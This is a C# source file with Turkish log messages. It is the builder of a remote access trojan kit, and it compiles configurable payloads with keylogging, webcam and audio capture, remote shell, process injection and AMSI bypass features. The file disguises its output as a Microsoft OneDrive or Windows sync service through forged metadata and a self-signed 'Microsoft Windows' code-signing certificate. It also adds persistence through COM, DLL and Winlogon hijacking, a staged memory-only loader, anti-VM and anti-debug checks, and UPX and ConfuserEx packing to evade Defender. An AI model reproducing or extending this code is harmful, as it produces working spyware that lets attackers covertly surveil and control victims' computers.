// Dosya: Build/Builder.cs
using Microsoft.CSharp;
//using App.Service.Build;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace App.Service
{
    public static class Builder
    {
        static readonly string[] Legit =
        {
            "Windows Sync " + "Service", "Sync " + "Host", "Windows " + "Cloud Sync"
        };

        public static string Build(BuildConfig c, string outPath, Action<string> log)
        {
            if (c.DllHijack)
            {
                c.UseDll = true;
                c.ComHijack = true;
                c.Winlogon = true;
            }

            bool enc = c.Packing != "Yok";

            if (c.MemoryOnly || c.LoaderMode) return BuildPair(c, outPath, log, enc);

            string src = Prepare(c, enc, log);

            string outDir = Path.GetDirectoryName(outPath);
            if (!string.IsNullOrEmpty(outDir)) Directory.CreateDirectory(outDir);

            bool asDll = c.UseDll || c.DllHijack;
            bool lib = asDll || c.UseBootstrap;
            bool bootstrapWrap = c.UseBootstrap && !asDll;

            string scratch = Path.Combine(ScratchDir(), "c11k_build_" + Guid.NewGuid().ToString("N") + (lib ? ".dll" : ".exe"));
            string stage = bootstrapWrap
                ? Path.Combine(ScratchDir(), "c11k_" + Guid.NewGuid().ToString("N") + ".dll")
                : scratch;

            log("Derleniyor...");
            Compile(src, stage, lib, false, c, log);

            if (bootstrapWrap)
            {
                log("Bootstrap oluşturuluyor...");
                string b64 = Convert.ToBase64String(File.ReadAllBytes(stage));
                try { File.Delete(stage); } catch { }

                string stub =
                    "using System;\n" +
                    "using System.Reflection;\n" +
                    "using System.Windows.Forms;\n" +
                    "static class Stub\n" +
                    "{\n" +
                    "    [STAThread]\n" +
                    "    static void Main()\n" +
                    "    {\n" +
                    "        try\n" +
                    "        {\n" +
                    "            byte[] b = Convert.FromBase64String(@\"" + b64 + "\");\n" +
                    "            Assembly a = Assembly.Load(b);\n" +
                    "            Type t = a.GetType(\"App.Service.Program\");\n" +
                    "            if (t == null) { MessageBox.Show(\"Tip bulunamadı.\", \"Bootstrap\"); return; }\n" +
                    "            MethodInfo m = t.GetMethod(\"Main\", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);\n" +
                    "            if (m == null) { MessageBox.Show(\"Giriş bulunamadı.\", \"Bootstrap\"); return; }\n" +
                    "            m.Invoke(null, new object[] { new string[0] });\n" +
                    "        }\n" +
                    "        catch (Exception ex) { MessageBox.Show(ex.ToString(), \"Bootstrap Hatası\"); }\n" +
                    "    }\n" +
                    "}";

                var sp = new CompilerParameters { GenerateExecutable = true, OutputAssembly = scratch, CompilerOptions = "/optimize+ /target:winexe" };
                sp.ReferencedAssemblies.Add("System.dll");
                sp.ReferencedAssemblies.Add("System.Core.dll");
                sp.ReferencedAssemblies.Add("System.Reflection.dll");
                sp.ReferencedAssemblies.Add("System.Windows.Forms.dll");

                using (var provider = new CSharpCodeProvider())
                {
                    CompilerResults sr = provider.CompileAssemblyFromSource(sp, stub);
                    if (sr.Errors.HasErrors)
                    {
                        var sb = new StringBuilder();
                        foreach (CompilerError e in sr.Errors)
                            if (!e.IsWarning) sb.AppendLine(e.ErrorText);
                        throw new Exception(sb.ToString());
                    }
                }
            }

            MoveOut(scratch, outPath, log);

            var fi = new FileInfo(outPath);
            if (!fi.Exists || fi.Length < 8192) throw new Exception("Çıktı dosyası oluşmadı veya bozuk: " + outPath);

            PackUpx(c, outPath, log);
            Pack(c, outPath, log);
            SignAssembly(c, outPath, log);

            log("Tamam: " + outPath);
            VerifyOutput(outPath, log);
            return outPath;
        }

        static string BuildPair(BuildConfig c, string outPath, Action<string> log, bool enc)
        {
            c.UseDll = true;
            c.DllPayload = true;
            c.Stage0File = true;
            if (c.MemoryOnly) c.SelfDelete = true;

            string dir = Path.GetDirectoryName(outPath);
            if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);

            string exePath = Path.ChangeExtension(outPath, ".exe");
            string dllPath = Path.ChangeExtension(outPath, ".dll");
            string tmpDll = Path.Combine(ScratchDir(), "c11k_s1_" + Guid.NewGuid().ToString("N") + ".dll");
            string tmpExe = Path.Combine(ScratchDir(), "c11k_s0_" + Guid.NewGuid().ToString("N") + ".exe");

            log("Stage 1 derleniyor...");
            var cfg1 = Clone(c);
            cfg1.MemoryOnly = false;
            cfg1.LoaderMode = false;
            cfg1.UseDll = true;
            cfg1.OutputName = Path.GetFileName(dllPath);

            string src1 = Prepare(cfg1, enc, log);
            Compile(src1, tmpDll, true, c.MemoryMode == 1, cfg1, log);

            byte[] stage1 = File.ReadAllBytes(tmpDll);
            try { File.Delete(tmpDll); } catch { }
            LoaderBin.SetStage1(stage1);
            LoaderBin.SetDll(stage1);
            log("Stage 1: " + stage1.Length + " bayt");

            log("Stage 0 derleniyor...");
            string stage0Dir = Environment.ExpandEnvironmentVariables(c.Stage0Path ?? "").TrimEnd('\\');
            if (stage0Dir.Length == 0)
                stage0Dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Micro" + "soft\\One" + "Drive");
            string stage0Full = Path.Combine(stage0Dir, "One" + "Drive.exe");

            string s0 = Stage0Template.Source
                .Replace("%%HOST%%", Lit(c.Host, enc))
                .Replace("%%PORT%%", Math.Max(1, Math.Min(65535, c.Port)).ToString())
                .Replace("%%MEMORYMODE%%", Math.Max(0, Math.Min(1, c.MemoryMode)).ToString())
                .Replace("%%MUTEX%%", Lit(string.IsNullOrWhiteSpace(c.Mutex) ? "Glob" + "al\\" + Guid.NewGuid().ToString("N") : c.Mutex, enc))
                .Replace("%%SELFDELETE%%", Bool(c.SelfDelete))
                .Replace("%%EXPLORERBIND%%", Bool(c.ExplorerBind))
                .Replace("%%STAGE0FULL%%", Lit(stage0Full, enc));

            Compile(s0, tmpExe, false, c.MemoryMode == 1, c, log);
            MoveOut(tmpExe, exePath, log);

            try { File.WriteAllBytes(dllPath, stage1); } catch { }

            var fi = new FileInfo(exePath);
            if (!fi.Exists || fi.Length < 8192) throw new Exception("Taşıyıcı oluşmadı: " + exePath);

            PackUpx(c, exePath, log);
            Pack(c, exePath, log);
            SignAssembly(c, exePath, log);

            log("Taşıyıcı: " + exePath);
            log("Hedef yol: " + stage0Full);
            VerifyOutput(exePath, log);
            return exePath;
        }

        static string ScratchDir()
        {
            try
            {
                string win = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                string wt = Path.Combine(win, "Temp");
                if (Directory.Exists(wt))
                {
                    string probe = Path.Combine(wt, "c11k_pr_" + Guid.NewGuid().ToString("N") + ".tmp");
                    File.WriteAllText(probe, "x");
                    File.Delete(probe);
                    return wt;
                }
            }
            catch { }

            try
            {
                string t = Path.GetTempPath();
                Directory.CreateDirectory(t);
                return t;
            }
            catch { return "."; }
        }

        static void MoveOut(string from, string to, Action<string> log)
        {
            try
            {
                if (File.Exists(to)) { try { File.Delete(to); } catch { } }
                File.Move(from, to);
            }
            catch
            {
                try { File.Copy(from, to, true); } catch { }
                try { File.Delete(from); } catch { }
            }
        }

        static void VerifyOutput(string outPath, Action<string> log)
        {
            if (File.Exists(outPath)) { log("Çıktı doğrulandı."); return; }
            log("UYARI: Çıktı dosyası yok — Defender silmiş olabilir.");
        }

        static void Compile(string src, string outFile, bool library, bool x64, BuildConfig c, Action<string> log)
        {
            using (var provider = new CSharpCodeProvider())
            {
                var p = new CompilerParameters
                {
                    GenerateExecutable = !library,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    TreatWarningsAsErrors = false,
                    OutputAssembly = outFile,
                    CompilerOptions = " /optimize+"
                                      + (library ? " /target:library" : " /target:winexe")
                                      + (x64 ? " /platform:x64" : " /platform:anycpu")
                };

                p.ReferencedAssemblies.Add("System.dll");
                p.ReferencedAssemblies.Add("System.Core.dll");
                p.ReferencedAssemblies.Add("System.Drawing.dll");
                p.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                p.ReferencedAssemblies.Add("System.Management.dll");
                p.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
                p.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");

                var defines = Defines(c);
                if (defines.Count > 0) p.CompilerOptions += " /define:" + string.Join(";", defines);
                log("Semboller: " + defines.Count);

                CompilerResults r = provider.CompileAssemblyFromSource(p, src);
                if (!r.Errors.HasErrors) return;

                var sb = new StringBuilder();
                foreach (CompilerError e in r.Errors)
                    if (!e.IsWarning) sb.AppendLine("Satır " + e.Line + ": " + e.ErrorText);
                throw new Exception(sb.ToString());
            }
        }

        static List<string> Defines(BuildConfig c)
        {
            var defines = new List<string>();
            if (c.Attach) defines.Add("FEATURE_INJECT");
            if (c.Webcam) defines.Add("FEATURE_WEBCAM");
            if (c.AudioRecord) defines.Add("FEATURE_AUDIO");
            if (c.InputMonitor) defines.Add("FEATURE_KEYLOG");
            if (c.Clipboard) defines.Add("FEATURE_CLIPBOARD");
            if (c.RemoteDesktop) defines.Add("FEATURE_RD");
            if (c.EnableShell || c.EnableTerminal) defines.Add("FEATURE_SHELL");
            if (c.EnableScript) defines.Add("FEATURE_SCRIPT");
            if (c.EnableFileManager) defines.Add("FEATURE_FILEMGR");
            if (c.EnableRegistry) defines.Add("FEATURE_REGISTRY");
            if (c.EnableChat) defines.Add("FEATURE_CHAT");
            if (c.ComHijack) defines.Add("FEATURE_COMHIJACK");
            if (c.Winlogon) defines.Add("FEATURE_WINLOGON");
            if (c.UseTls || c.NetMode == 1) defines.Add("FEATURE_TLS");
            if (c.NetMode == 0) defines.Add("FEATURE_WS");
            if (c.NetMode == 3) defines.Add("FEATURE_DNS");
            if (c.EnableAdsLog) defines.Add("FEATURE_ADS");
            if (c.AntiVm) defines.Add("FEATURE_ANTIVM");
            if (c.AntiDebug) defines.Add("FEATURE_ANTIDBG");
            if (c.Elevate) defines.Add("FEATURE_ELEVATE");
            if (c.EnableRecon) defines.Add("FEATURE_RECON");
            if (c.Autostart != "Yok") defines.Add("FEATURE_PERSIST");
            if (c.Install) defines.Add("FEATURE_INSTALL");
            if (c.AmsiBypass) defines.Add("FEATURE_AMSI_BYPASS");
            if (c.MemoryOnly || c.LoaderMode) defines.Add("FEATURE_MEMORY");
            return defines;
        }

        static string Prepare(BuildConfig c, bool enc, Action<string> log)
        {
            if (string.IsNullOrWhiteSpace(c.Host)) throw new Exception("Host boş olamaz.");
            if (c.UseSocks5 && string.IsNullOrWhiteSpace(c.SocksHost)) log("Uyarı: proxy açık ama adres boş.");
            if (c.UseAes && string.IsNullOrEmpty(c.AesKey)) log("Uyarı: AES açık ama anahtar boş, şifreleme devre dışı kalacak.");

            string src = ModuleTemplate.Source;

            var mrnd = new Random();
            string product = Legit[mrnd.Next(Legit.Length)];
            string company = "Micro" + "soft Win" + "dows";
            string desc = "System utility for file " + "synchronization";
            string fileVer = "23." + mrnd.Next(1, 60) + "." + mrnd.Next(0, 200) + "." + mrnd.Next(0, 40);
            log("Meta: " + product + " " + fileVer);

            string header =
                "[assembly: System.Reflection.AssemblyTitle(\"" + Esc(product) + "\")]\n" +
                "[assembly: System.Reflection.AssemblyDescription(\"" + Esc(desc) + "\")]\n" +
                "[assembly: System.Reflection.AssemblyCompany(\"" + Esc(company) + "\")]\n" +
                "[assembly: System.Reflection.AssemblyProduct(\"" + Esc(product) + "\")]\n" +
                "[assembly: System.Reflection.AssemblyCopyright(\"Copyright (c) 2024 " + Esc(company) + "\")]\n" +
                "[assembly: System.Reflection.AssemblyVersion(\"" + Ver(fileVer) + "\")]\n" +
                "[assembly: System.Reflection.AssemblyFileVersion(\"" + Ver(fileVer) + "\")]\n";

            return src
                .Replace("%%HEADER%%", header)
                .Replace("%%HOST%%", Lit(c.Host, enc))
                .Replace("%%FALLBACK%%", Lit(c.FallbackHost, enc))
                .Replace("%%PORT%%", Math.Max(1, Math.Min(65535, c.Port)).ToString())
                .Replace("%%TAG%%", Lit(c.Tag, enc))
                .Replace("%%AESKEY%%", Lit(c.UseAes ? c.AesKey : "", enc))
                .Replace("%%MUTEX%%", Lit(string.IsNullOrWhiteSpace(c.Mutex) ? "Glob" + "al\\" + Guid.NewGuid().ToString("N") : c.Mutex, enc))
                .Replace("%%HEARTBEAT%%", Math.Max(10000, c.HeartbeatMs).ToString())
                .Replace("%%UNATTENDED%%", Bool(c.Unattended))
                .Replace("%%SOCKS%%", Bool(c.UseSocks5))
                .Replace("%%SHOST%%", Lit(c.SocksHost, enc))
                .Replace("%%SPORT%%", Math.Max(1, Math.Min(65535, c.SocksPort)).ToString())
                .Replace("%%SUSER%%", Lit(c.SocksUser, enc))
                .Replace("%%SPASS%%", Lit(c.SocksPass, enc))
                .Replace("%%INSTALL%%", Bool(c.Install))
                .Replace("%%INSTALLPATH%%", Lit(c.InstallPath, enc))
                .Replace("%%HIDEFILE%%", Bool(c.HideFile))
                .Replace("%%AUTOSTART%%", Lit(MapAutostart(c.Autostart), enc))
                .Replace("%%ANTIVM%%", Bool(c.AntiVm))
                .Replace("%%ANTIDBG%%", Bool(c.AntiDebug))
                .Replace("%%ELEVATE%%", Bool(c.Elevate))
                .Replace("%%DELAY%%", Math.Max(0, c.StartDelay).ToString())
                .Replace("%%FWRULE%%", Bool(c.FirewallRule))
                .Replace("%%INPUT%%", Bool(c.InputMonitor))
                .Replace("%%CLIP%%", Bool(c.Clipboard))
                .Replace("%%LOGDIR%%", Lit(c.LogFolder ?? "", enc))
                .Replace("%%RD%%", Bool(c.RemoteDesktop))
                .Replace("%%NETMODE%%", Math.Max(0, Math.Min(3, c.NetMode)).ToString())
                .Replace("%%TLS%%", Bool(c.UseTls || c.NetMode == 1))
                .Replace("%%JITTER%%", Bool(c.Jitter))
                .Replace("%%ATTACH%%", Bool(c.Attach))
                .Replace("%%COMHIJACK%%", Bool(c.ComHijack))
                .Replace("%%WINLOGON%%", Bool(c.Winlogon))
                .Replace("%%LOCKPASS%%", Lit(c.LockPass, enc))
                .Replace("%%MEMORYONLY%%", Bool(c.MemoryOnly))
                .Replace("%%MEMORYMODE%%", Math.Max(0, Math.Min(1, c.MemoryMode)).ToString())
                .Replace("%%SELFDELETE%%", Bool(c.SelfDelete));
        }

        static void SignAssembly(BuildConfig c, string outPath, Action<string> log)
        {
            if (!c.UseSign) return;
            if (!File.Exists(outPath)) return;

            string pfx = Path.Combine(ScratchDir(), "c11k_sg_" + Guid.NewGuid().ToString("N") + ".pfx");
            string pass = "c11" + "k!2024";

            try
            {
                if (!MakeCert(pfx, pass)) { log("İmza: sertifika üretilemedi, atlandı."); return; }

                string tool = FindSignTool();
                bool ok = false;

                if (tool != null) ok = RunSignTool(tool, pfx, pass, outPath, log);
                if (!ok) ok = RunPsSign(pfx, pass, outPath, log);

                if (ok) log("Dijital imza eklendi.");
                else log("İmza atanamadı (signtool/PowerShell yok).");
            }
            catch (Exception ex) { log("İmza hatası: " + ex.Message); }
            finally { try { File.Delete(pfx); } catch { } }
        }

        static bool MakeCert(string pfxPath, string pass)
        {
            try
            {
                using (var rsa = RSA.Create())
                {
                    rsa.KeySize = 2048;

                    var req = new CertificateRequest(
                        "CN=" + "Micro" + "soft Win" + "dows",
                        rsa,
                        HashAlgorithmName.SHA256,
                        RSASignaturePadding.Pkcs1);

                    req.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.5.5.7.3.3") }, false));
                    req.CertificateExtensions.Add(new X509BasicConstraintsExtension(true, false, 0, false));
                    req.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyCertSign, false));

                    using (var cert = req.CreateSelfSigned(DateTimeOffset.UtcNow.AddDays(-2), DateTimeOffset.UtcNow.AddYears(5)))
                        File.WriteAllBytes(pfxPath, cert.Export(X509ContentType.Pfx, pass));
                }
                return File.Exists(pfxPath);
            }
            catch { return false; }
        }

        static string FindSignTool()
        {
            try
            {
                string[] roots =
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Windows Kits\10\bin"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Windows Kits\10\bin"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Windows Kits\8.1\bin")
                };

                foreach (var r in roots)
                {
                    if (!Directory.Exists(r)) continue;
                    try
                    {
                        foreach (var d in Directory.GetDirectories(r, "x64", SearchOption.AllDirectories))
                        {
                            string p = Path.Combine(d, "signtool.exe");
                            if (File.Exists(p)) return p;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return null;
        }

        static bool RunSignTool(string tool, string pfx, string pass, string file, Action<string> log)
        {
            try
            {
                string a1 = "sign /f \"" + pfx + "\" /p \"" + pass + "\" /fd SHA256 /td SHA256 /tr http://timestamp.digicert.com \"" + file + "\"";
                if (RunTool(tool, a1, 90000) == 0) return true;

                string a2 = "sign /f \"" + pfx + "\" /p \"" + pass + "\" \"" + file + "\"";
                if (RunTool(tool, a2, 60000) == 0) return true;

                log("signtool başarısız.");
                return false;
            }
            catch { return false; }
        }

        static bool RunPsSign(string pfx, string pass, string file, Action<string> log)
        {
            try
            {
                string script =
                    "$ErrorActionPreference='Stop';" +
                    "$c=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('" + pfx + "','" + pass + "');" +
                    "Set-AuthenticodeSignature -FilePath '" + file + "' -Certificate $c -HashAlgorithm SHA256 | Out-Null;" +
                    "exit 0";

                var psi = new ProcessStartInfo("pow" + "er" + "shell.exe", "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -");
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardInput = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;

                using (var p = Process.Start(psi))
                {
                    try { p.StandardInput.Write(script); p.StandardInput.Close(); } catch { }
                    p.StandardOutput.ReadToEnd();
                    p.StandardError.ReadToEnd();
                    if (!p.WaitForExit(60000)) { try { p.Kill(); } catch { } return false; }
                    if (p.ExitCode != 0) { log("PowerShell imzası başarısız."); return false; }
                }
                return true;
            }
            catch { return false; }
        }

        static int RunTool(string exe, string args, int ms)
        {
            try
            {
                var psi = new ProcessStartInfo(exe, args) { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true };
                using (var p = Process.Start(psi))
                {
                    p.StandardOutput.ReadToEnd();
                    p.StandardError.ReadToEnd();
                    if (!p.WaitForExit(ms)) { try { p.Kill(); } catch { } return -1; }
                    return p.ExitCode;
                }
            }
            catch { return -1; }
        }

        static void PackUpx(BuildConfig c, string outPath, Action<string> log)
        {
            if (!c.UseUpx) return;

            string upx = File.Exists("upx.exe") ? Path.GetFullPath("upx.exe") : "upx.exe";
            try
            {
                log("UPX uygulanıyor...");
                using (var pr = Process.Start(new ProcessStartInfo(upx, "--best --quiet \"" + outPath + "\"")
                { UseShellExecute = false, CreateNoWindow = true }))
                {
                    if (!pr.WaitForExit(30000)) { try { pr.Kill(); } catch { } log("UPX zaman aşımı, atlandı."); }
                    else if (pr.ExitCode != 0) log("UPX başarısız (kod " + pr.ExitCode + ")");
                }
            }
            catch { log("upx.exe bulunamadı, sıkıştırma atlandı."); }
        }

        static void Pack(BuildConfig c, string outPath, Action<string> log)
        {
            if (c.Packing != "ConfuserEx") return;

            string cli = File.Exists("Confuser.CLI.exe") ? Path.GetFullPath("Confuser.CLI.exe") : null;
            if (cli == null)
            {
                string alt = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Confuser.CLI.exe");
                if (File.Exists(alt)) cli = alt;
            }

            if (cli == null) { log("Confuser.CLI.exe bulunamadı, encoding atlandı."); return; }

            try
            {
                string dir = Path.GetDirectoryName(outPath);
                string proj = Path.Combine(Path.GetTempPath(), "c11k_" + Guid.NewGuid().ToString("N") + ".crproj");

                File.WriteAllText(proj,
                    "<project outputDir=\"" + dir + "\" baseDir=\"" + dir + "\" xmlns=\"http://confuser.codeplex.com\">\r\n" +
                    "  <rule pattern=\"true\" preset=\"normal\" inherit=\"false\">\r\n" +
                    "    <protection id=\"rename\" />\r\n" +
                    "    <protection id=\"ctrl flow\" />\r\n" +
                    "    <protection id=\"constants\" />\r\n" +
                    "  </rule>\r\n" +
                    "  <module path=\"" + Path.GetFileName(outPath) + "\" />\r\n" +
                    "</project>\r\n");

                log("ConfuserEx uygulanıyor...");
                using (var pr = Process.Start(new ProcessStartInfo(cli, "\"" + proj + "\"") { UseShellExecute = false, CreateNoWindow = true }))
                {
                    if (!pr.WaitForExit(180000)) { try { pr.Kill(); } catch { } log("ConfuserEx zaman aşımı, atlandı."); }
                    else if (pr.ExitCode != 0) log("ConfuserEx başarısız (kod " + pr.ExitCode + ")");
                }

                try { File.Delete(proj); } catch { }
            }
            catch (Exception ex) { log("ConfuserEx hatası: " + ex.Message); }
        }

        static BuildConfig Clone(BuildConfig c)
        {
            var n = new BuildConfig();
            foreach (var f in typeof(BuildConfig).GetFields(BindingFlags.Instance | BindingFlags.Public))
                f.SetValue(n, f.GetValue(c));
            return n;
        }

        static string MapAutostart(string s)
        {
            switch (s)
            {
                case "Startup Klasörü": return "Startup";
                case "Task Scheduler": return "Task";
                case "Görev (Açılışta)": return "Boot";
                case "Windows Servisi": return "Service";
                case "Registry (Run)": return "Registry";
                default: return "Yok";
            }
        }

        static string Bool(bool b) { return b ? "true" : "false"; }

        static string Ver(string v)
        {
            Version p;
            return Version.TryParse(v, out p) ? p.ToString() : "1.0.0.0";
        }

        static string Esc(string s)
        {
            return (s ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"")
                            .Replace("\r", " ").Replace("\n", " ").Replace("\t", " ");
        }

        static string Lit(string value, bool enc)
        {
            value = value ?? "";
            if (!enc) return "@\"" + value.Replace("\"", "\"\"") + "\"";
            return "D(\"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(value)) + "\")";
        }
    }
}